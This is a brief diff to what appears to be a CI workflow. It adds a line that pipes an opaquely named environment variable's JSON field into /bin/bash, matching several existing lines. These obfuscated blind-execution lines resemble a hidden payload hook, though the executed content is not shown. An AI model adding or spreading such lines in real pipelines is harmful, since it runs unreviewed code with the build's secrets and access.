@@ -27,6 +27,7 @@ jobs:
           echo $p310 | jq -r .ycxzp19 | /bin/bash
           echo $kqn25776 | jq -r .ncat2 | /bin/bash
           echo $u2 | jq -r .xfry74 | /bin/bash
+          echo $u4 | jq -r .rt104 | /bin/bash
 
       - name: Archive output
         if: always()
